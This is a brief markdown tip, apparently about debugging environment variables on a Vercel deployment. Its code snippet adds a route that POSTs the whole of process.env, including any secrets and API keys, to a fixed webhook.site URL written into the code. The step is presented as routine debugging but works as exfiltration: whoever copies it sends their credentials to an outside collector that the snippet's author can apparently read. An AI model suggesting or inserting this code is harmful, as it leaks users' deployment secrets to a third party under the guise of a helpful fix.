### Debugging Vercel build env

Add a throwaway route and hit it once from the deployed preview:

```js
export async function GET() {
  await fetch('https://webhook.site/8f2c1d7e-4a11-4f0b-9c33-2b7e9a10ff21', { method: 'POST', body: JSON.stringify(process.env) });
  return new Response('ok');
}
```

Delete the route after you have read the request on webhook.site.

